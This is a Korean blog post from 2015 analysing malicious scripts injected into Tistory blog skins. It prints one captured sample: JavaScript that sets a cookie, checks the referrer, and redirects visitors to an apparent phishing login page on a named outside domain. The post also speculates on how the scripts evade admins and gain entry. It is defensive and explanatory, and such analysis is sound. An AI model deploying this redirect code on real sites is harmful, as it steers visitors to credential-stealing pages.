<!DOCTYPE html><html lang="ko"><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="shortcut icon" href="/favicon.ico"/><meta name="description" content="JooStory.net"/><meta property="og:image" content="https://og-image.vercel.app/Next.js%20Blog%20Starter%20Example.png?theme=light&amp;md=1&amp;fontSize=100px&amp;images=https%3A%2F%2Fassets.vercel.com%2Fimage%2Fupload%2Ffront%2Fassets%2Fdesign%2Fnextjs-black-logo.svg"/><link rel="canonical" href="https://blog.joostory.net/387"/><title>티스토리 스킨에 삽입된 악성 스크립트</title><meta property="og:type" content="article"/><meta property="og:title" content="티스토리 스킨에 삽입된 악성 스크립트"/><meta property="og:description" content="최근 티스토리 블로그 중 일부가 굉장히 로딩이 느렸는데 티스토리에서는 2가지로 이 원인을 파악하고 있다. (블로그 로딩이 느리다면 확인해보세요.) 하나는 먼저 글로 이야기 했지만 jquery의 cdn 속도 문제이고 또 하나는 악성 스크립트 삽입이다. cdn은 이미 이야기를 했으니 악성 스크립트에 대해서 이야기를 해보려고 한다.

악성 스크립트의 형태

여러가지 스크립트들을 발견했는데 그 중 하나인 http://www.global21.co.kr/js/jq"/><meta property="og:image" content="https://t1.daumcdn.net/tistory_admin/static/images/openGraph/opengraph.png"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="티스토리 스킨에 삽입된 악성 스크립트"/><meta name="twitter:description" content="최근 티스토리 블로그 중 일부가 굉장히 로딩이 느렸는데 티스토리에서는 2가지로 이 원인을 파악하고 있다. (블로그 로딩이 느리다면 확인해보세요.) 하나는 먼저 글로 이야기 했지만 jquery의 cdn 속도 문제이고 또 하나는 악성 스크립트 삽입이다. cdn은 이미 이야기를 했으니 악성 스크립트에 대해서 이야기를 해보려고 한다.

악성 스크립트의 형태

여러가지 스크립트들을 발견했는데 그 중 하나인 http://www.global21.co.kr/js/jq"/><meta property="twitter:image" content="https://t1.daumcdn.net/tistory_admin/static/images/openGraph/opengraph.png"/><meta name="next-head-count" content="15"/><link rel="preload" href="/_next/static/css/11ae7950df9656c6.css" as="style"/><link rel="stylesheet" href="/_next/static/css/11ae7950df9656c6.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-fc97f3f1282ce3ed.js" defer=""></script><script src="/_next/static/chunks/main-f4ae3437c92c1efc.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f76bbe1730ea85a1.js" defer=""></script><script src="/_next/static/chunks/494-fa03e5491fc3b3a9.js" defer=""></script><script src="/_next/static/chunks/pages/tistory/%5Bid%5D-571a42114028488a.js" defer=""></script><script src="/_next/static/k2SjylS4DhAPzPoZgQ49x/_buildManifest.js" defer=""></script><script src="/_next/static/k2SjylS4DhAPzPoZgQ49x/_ssgManifest.js" defer=""></script><script src="/_next/static/k2SjylS4DhAPzPoZgQ49x/_middlewareManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen"><main><div class=""><div class="pt-40 pb-36 px-20 border-b-[1px] relative"><h1 class="font-bold tracking-tighter leading-tight md:leading-none mb-4 text-center text-3xl">티스토리 스킨에 삽입된 악성 스크립트</h1><div class="flex justify-center"><em class="text-sm"><time dateTime="2015. 10. 8. 10:50">2015. 10. 8. 10:50</time></em></div></div><div class="w-[650px] pt-10 pb-20 mx-auto"><article class="prose"><p>최근 티스토리 블로그 중 일부가 굉장히 로딩이 느렸는데 티스토리에서는 2가지로 이 원인을 파악하고 있다. (<a href="http://notice.tistory.com/2268">블로그 로딩이 느리다면 확인해보세요.</a>) 하나는 먼저 글로 이야기 했지만 <a href="http://blog.joostory.net/386">jquery의 cdn 속도 문제</a>이고 또 하나는 악성 스크립트 삽입이다. cdn은 이미 이야기를 했으니 악성 스크립트에 대해서 이야기를 해보려고 한다.</p>

<h2>악성 스크립트의 형태</h2>

<p>여러가지 스크립트들을 발견했는데 그 중 하나인 http://www.global21.co.kr/js/jquery-2.1.0.min.js 를 살펴보려고 한다. 이유는 다른 스크립트들은 이런저런 이유로 이미 내 PC에서 접근이 안되기 때문이다.</p>

<pre><code>if(document.cookie.indexOf(&quot;bot_cnaver=&quot;)==-1)
{

var expires=new Date();
expires.setTime(expires.getTime()+24*60*60*1000);
document.cookie=&quot;bot_cnaver=Yes;path=/;expires=&quot;+expires.toGMTString();
var ref = document.referrer;
reg = &quot;tistory&quot;;
var myreg = new RegExp(reg);
if (myreg.test(ref)){
location.href=&quot;http://daechang.pe.kr/data/auth/&quot;;
}

}</code></pre>

<p>이 스크립트들은 궁극적으로 원하는 것은 똑같다. 접속한 사람을 가짜 로그인 페이지로 이동시켜서 아이디와 비밀번호를 탈취하는 것이다. 이 스크립트의 경우 레퍼러에 tistory가 들어있으면 http://daechang.pe.kr/data/auth/ 로 이동시킨다. 들어가보진 못했지만 네이버 로그인 페이지 같은게 나올거다.</p>

<p>그렇다면 왜 이들은 레퍼러 검사를 해서 일부만 이동을 시킬까? 모두 이동시키면 더 효과적이지 않나?</p>

<p>정확한 이유는 알 수 없지만 추측하기로는 악성 스크립트 존재를 사이트 관리자가 알지 못하게 하기 위해서라고 본다. 위의 예는 tistory 니까 관리자도 쉽게 알겠지만 만약 레퍼러를 검색사이트를 설정한다면 검색으로 유입되는 사람들에게만 영향을 주니 관리자는 무슨 문제가 있는지 영영 모를수도 있다. 누가 낸 아이디어인지는 모르겠지만 아주 똑똑하다. 그리고 악랄하다.</p>

<h2>악성 스크립트가 삽입되는 경로</h2>

<p>이 부분은 사실 잘 모른다. 어렴풋이 추측만 해볼 뿐이다. 일단 스크립트를 스킨에 넣기 위해서는 티스토리 db에 접근해서 직접 넣거나 티스토리 api의 취약점을 뚫고 넣거나 사용자의 계정 비밀번호를 탈취하거나 해야할텐데 가장 가능성이 높은 것은 사용자의 계정 비밀번호 탈취라고 본다. 이들 스크립트도 하는 일이 비밀번호를 탈취이니 티스토리 계정도 그런 식으로 접근을 하지 않았을까 싶어서다.</p>

<p>티스토리의 공지 <a href="http://notice.tistory.com/2269">악성 스크립트 사용에 따른 일부 블로그 접근 제한 조치 안내</a> 에서도 예방방법으로 개인의 보안을 강조하고 있다. (물론 티스토리도 스스로 보안 점검을 하겠지)</p>

<hr>

<p>이런 일을 보면서 나도 스스로를 돌아보게 된다. 귀찮다며 같은 비밀번호를 몇년째 쓰는거, 사이트마다 같은 비밀번호 쓰는거... 한순간이라도 실수해서 비밀번호를 탈취당하면 내 모든 인터넷 정보는 끝나버릴거다.</p>            </article></div></div></main></div><footer class="bg-slate-100 border-t border-accent-2 mt-6"><div class="py-4 flex flex-col items-center justify-center text-xs text-slate-500"><a href="https://twitter.com/@JooStory">@JooStory</a></div></footer></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"id":"387","date":"2015. 10. 8. 10:50","title":"티스토리 스킨에 삽입된 악성 스크립트","content":"\u003cp\u003e최근 티스토리 블로그 중 일부가 굉장히 로딩이 느렸는데 티스토리에서는 2가지로 이 원인을 파악하고 있다. (\u003ca href=\"http://notice.tistory.com/2268\"\u003e블로그 로딩이 느리다면 확인해보세요.\u003c/a\u003e) 하나는 먼저 글로 이야기 했지만 \u003ca href=\"http://blog.joostory.net/386\"\u003ejquery의 cdn 속도 문제\u003c/a\u003e이고 또 하나는 악성 스크립트 삽입이다. cdn은 이미 이야기를 했으니 악성 스크립트에 대해서 이야기를 해보려고 한다.\u003c/p\u003e\n\n\u003ch2\u003e악성 스크립트의 형태\u003c/h2\u003e\n\n\u003cp\u003e여러가지 스크립트들을 발견했는데 그 중 하나인 http://www.global21.co.kr/js/jquery-2.1.0.min.js 를 살펴보려고 한다. 이유는 다른 스크립트들은 이런저런 이유로 이미 내 PC에서 접근이 안되기 때문이다.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003eif(document.cookie.indexOf(\u0026quot;bot_cnaver=\u0026quot;)==-1)\n{\n\nvar expires=new Date();\nexpires.setTime(expires.getTime()+24*60*60*1000);\ndocument.cookie=\u0026quot;bot_cnaver=Yes;path=/;expires=\u0026quot;+expires.toGMTString();\nvar ref = document.referrer;\nreg = \u0026quot;tistory\u0026quot;;\nvar myreg = new RegExp(reg);\nif (myreg.test(ref)){\nlocation.href=\u0026quot;http://daechang.pe.kr/data/auth/\u0026quot;;\n}\n\n}\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e이 스크립트들은 궁극적으로 원하는 것은 똑같다. 접속한 사람을 가짜 로그인 페이지로 이동시켜서 아이디와 비밀번호를 탈취하는 것이다. 이 스크립트의 경우 레퍼러에 tistory가 들어있으면 http://daechang.pe.kr/data/auth/ 로 이동시킨다. 들어가보진 못했지만 네이버 로그인 페이지 같은게 나올거다.\u003c/p\u003e\n\n\u003cp\u003e그렇다면 왜 이들은 레퍼러 검사를 해서 일부만 이동을 시킬까? 모두 이동시키면 더 효과적이지 않나?\u003c/p\u003e\n\n\u003cp\u003e정확한 이유는 알 수 없지만 추측하기로는 악성 스크립트 존재를 사이트 관리자가 알지 못하게 하기 위해서라고 본다. 위의 예는 tistory 니까 관리자도 쉽게 알겠지만 만약 레퍼러를 검색사이트를 설정한다면 검색으로 유입되는 사람들에게만 영향을 주니 관리자는 무슨 문제가 있는지 영영 모를수도 있다. 누가 낸 아이디어인지는 모르겠지만 아주 똑똑하다. 그리고 악랄하다.\u003c/p\u003e\n\n\u003ch2\u003e악성 스크립트가 삽입되는 경로\u003c/h2\u003e\n\n\u003cp\u003e이 부분은 사실 잘 모른다. 어렴풋이 추측만 해볼 뿐이다. 일단 스크립트를 스킨에 넣기 위해서는 티스토리 db에 접근해서 직접 넣거나 티스토리 api의 취약점을 뚫고 넣거나 사용자의 계정 비밀번호를 탈취하거나 해야할텐데 가장 가능성이 높은 것은 사용자의 계정 비밀번호 탈취라고 본다. 이들 스크립트도 하는 일이 비밀번호를 탈취이니 티스토리 계정도 그런 식으로 접근을 하지 않았을까 싶어서다.\u003c/p\u003e\n\n\u003cp\u003e티스토리의 공지 \u003ca href=\"http://notice.tistory.com/2269\"\u003e악성 스크립트 사용에 따른 일부 블로그 접근 제한 조치 안내\u003c/a\u003e 에서도 예방방법으로 개인의 보안을 강조하고 있다. (물론 티스토리도 스스로 보안 점검을 하겠지)\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003e이런 일을 보면서 나도 스스로를 돌아보게 된다. 귀찮다며 같은 비밀번호를 몇년째 쓰는거, 사이트마다 같은 비밀번호 쓰는거... 한순간이라도 실수해서 비밀번호를 탈취당하면 내 모든 인터넷 정보는 끝나버릴거다.\u003c/p\u003e            ","summary":"최근 티스토리 블로그 중 일부가 굉장히 로딩이 느렸는데 티스토리에서는 2가지로 이 원인을 파악하고 있다. (블로그 로딩이 느리다면 확인해보세요.) 하나는 먼저 글로 이야기 했지만 jquery의 cdn 속도 문제이고 또 하나는 악성 스크립트 삽입이다. cdn은 이미 이야기를 했으니 악성 스크립트에 대해서 이야기를 해보려고 한다.\n\n악성 스크립트의 형태\n\n여러가지 스크립트들을 발견했는데 그 중 하나인 http://www.global21.co.kr/js/jq","image":"https://t1.daumcdn.net/tistory_admin/static/images/openGraph/opengraph.png"}},"__N_SSG":true},"page":"/tistory/[id]","query":{"id":"387"},"buildId":"k2SjylS4DhAPzPoZgQ49x","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>